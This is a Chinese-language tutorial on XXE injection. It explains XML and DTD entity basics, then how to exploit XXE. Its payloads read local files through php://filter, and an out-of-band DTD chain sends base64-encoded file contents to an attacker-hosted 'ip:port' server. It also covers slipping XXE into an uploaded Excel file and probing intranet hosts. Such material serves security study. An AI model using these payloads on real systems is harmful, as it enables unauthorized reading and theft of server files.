XXE(XML External Entity)：XML外部实体注入攻击

​ 发生在应用程序解析xml输入时没有禁止外部实体加载，导致攻击者可以通过xml的外部实体获取服务器中本应该被保护的数据

XML及DTE

XML基础

是一种灵活的语言，所有标签都可以自定义，设计宗旨是传输数据

XML文档结构包含：xml声明，dtd文档类型定义(*)，文档元素

 <?xml version="1.0" encode="utf=8"?>   #XML文档声明
 <book id="1">                   #自定义根元素book,属性id为1
  <name>XML</name>           #自定义四个子元素，即book的属性
  <author>xml</author>
  <year>2023</year>
  <price>19.9</price>
 </book>         #根元素闭合
  1. xml必须有一个根元素
  2. 元素必须有一个关闭标签
  3. 标签对大小写敏感
  4. 元素必须被正确嵌套
  5. 属性值必须加引号

DTD基础

为xml定义语义约束

可以把DTD理解为一个模板，模板中定义了用户自己创建的根元素及其相应的子元素，如

 <!DOCTYPE book [
     <!ELEMENT book (name, author, year)>
     <!ELEMENT name (#PCDATA)>
     <!ELEMENT author (#PCDATA)>
     <!ELEMENT year (#PCDATA)
 ]>  #内部
 <!DOCTYPE book SYSTEM "file">  #外部

CDATA 指的是不应该由XML解析器进行解析的文本数据，CDATA部分所有内容都会被解析器忽略，例如<(新元素开始)和&(字符实体开始)在xml中是非法的

语法：由<![CDATA[开始, ]]> 结束

  • CDATA部分不能包括字符串”]]>”也不允许嵌套
  • 标记结尾的”]]>”不能包含空格或换行
DTD实体

  1. 内部普通实体

    声明: <!ENTITY 实体名 "值">

    引用: &实体名;

  2. 外部普通实体

    声明: <!ENTITY 实体名 SYSTEM "URI/URL">

    利用：

     <?xml version="1.0" encode="utf=8"?> 
 <!DOCTYPE ANY [
     <!ENTITY xxe SYSTEM “php://filter/read=convert.base64-encode/resource=xxx">
 ]>
 <root>&xxe;</root>

不允许内部实体和外部实体一起使用

  1. 参数实体

    声明：

     * 内部：`<!ENTITY % 实体名 "值">`
 * 外部：`<!ENTITY % 实体名 SYSTEM "URI">`

    只能在DTD中引用：%实体名;

    参数实体必须定义在单独的DTD文档中或XML文档的DTD区，前者为该XML文档的外部子集，后者为该XML文档的内部子集。但是引用只能在DTD文档中:即外部子集，而不能在XML文档的DTD区。

XXE

漏洞发现

  1. 寻找接受XML作为输入内容的端点

    通过修改http请求包中Content-Type字段等方法，查看响应

  2. 如果解析xml就可以尝试引用实体和DTD

  3. 如果可以引用外部实体，则存在XXE

漏洞利用

  1. 本地文件读取

    • file://
    • php://filter

    若XXE无回显，则可以：

    首先在自己服务器加入DTD文件，然后直接调用外部实体，通过本地端口监听

     <!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:port/?p=%file;'>">

    来在本地读取

  2. 内网主机探测

    爆破c段，无回显查看时长

Java中上传excel

更改excel后缀为zip，打开后更改xml，在开始添加xxe代码

免费的隧道 注册后安装tomcat并配置端口与隧道一致，将dtd文件放在webapps/ROOT目录下，调用后在logs文件夹中查看

eg.dtd:

 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=target">
 <!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'ip/?%file;'>">

包中代码：

 <?xml version="1.0"?>
 <!DOCTYPE ANY[
 <!ENTITY % dtd SYSTEM "ip/eg.dtd">
 %dtd;
 %int;
 %send;
 ]>

之后查看日志
